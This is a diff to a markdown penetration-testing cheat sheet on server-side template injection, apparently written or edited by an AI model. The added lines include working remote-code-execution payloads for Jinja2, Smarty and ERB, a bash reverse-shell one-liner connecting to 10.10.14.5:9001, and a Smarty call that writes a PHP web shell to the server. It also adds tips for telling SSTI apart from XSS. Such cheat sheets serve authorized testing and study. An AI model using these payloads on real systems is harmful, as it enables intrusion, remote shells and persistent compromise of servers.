@@ -210,6 +210,8 @@ If outbound DNS/HTTP is firewalled, fall back to differential behavior (error me
 
 Occurs when user input lands in the **template string** itself (not just the values passed to it) before rendering.
 
+> [!tip] **An XSS in an auto-escaping engine is an SSTI tell — chase it.** Jinja2 (and Twig, Django, etc.) HTML-escape output *by default*, so if your `<b>x</b>` renders **unescaped**, only three things explain it: (1) the template applied `|safe`, (2) it's inside `{% autoescape false %}`, or (3) **your input is concatenated into the template source** — which is SSTI. `{{7*7}}` separates #3 from #1/#2 in a single request. Don't file the unescaped output as "just XSS" and move on; the reflected-XSS and the SSTI are the *same* root cause (input treated as template, not data), and the SSTI is the one that gives RCE.
+
 ### Confirm + Fingerprint Engine
 
 ```bash
@@ -247,6 +249,10 @@ flowchart TD
 {{ self.__init__.__globals__.__builtins__ }}
 {{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
+
+# lipsum reaches os directly — shortest reliable gadget, works when self/config are filtered:
+{{ lipsum.__globals__['os'].popen('id').read() }}
+{{ lipsum.__globals__.os.popen("bash -c 'bash -i >& /dev/tcp/10.10.14.5/9001 0>&1'").read() }}
 ```
 
 ### Twig (PHP — Symfony)
@@ -277,6 +283,24 @@ $ex.waitFor()
 #foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
 ```
 
+### Smarty (PHP) & ERB (Ruby) — the other two you'll hit often
+
+```smarty
+{* Smarty (PHP) — {$s} is the confirm; modern Smarty sandboxes {php} so use the static call *}
+{$smarty.version}
+{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system($_GET[0]); ?>",self::clearConfig())}
+{system('id')}                      {* older/unsandboxed Smarty *}
+```
+
+```erb
+<%# ERB (Ruby — Rails views, Puppet). Confirm with <%= 7*7 %> → 49 %>
+<%= system('id') %>
+<%= `id` %>
+<%= IO.popen('id').read %>
+```
+
+> [!note] No `{{ }}`/`${ }` and the confirm probes fail? Try **`<%= %>`** (ERB/Ruby) and **`{ }`** (Smarty) — the two syntaxes the fingerprint tree above doesn't branch to.
+
 ### SSTImap (Automation)
 
 ```bash
@@ -289,7 +313,7 @@ python3 sstimap.py -u "http://<TARGET_IP>/index.php?name=test" --os-shell       
 ```
 
 > [!tip]
-> For other engines (Thymeleaf, Mako, Smarty, etc.), the identification/exploitation logic is the same — only the syntax changes. Check the PayloadsAllTheThings SSTI cheat sheet for the specific engine's RCE gadget.
+> For the remaining engines (Thymeleaf, Mako, Handlebars/Pug, etc.), the identification/exploitation logic is the same — only the syntax changes. Check the PayloadsAllTheThings SSTI cheat sheet for the specific engine's RCE gadget.
 
 ---
 
@@ -582,5 +606,5 @@ What you're up against per class, and where each control still leaks — useful 
 ---
 
 *Created: 2026-07-14*
-*Updated: 2026-08-28*
+*Updated: 2026-09-01*
 *Model: claude-opus-5*
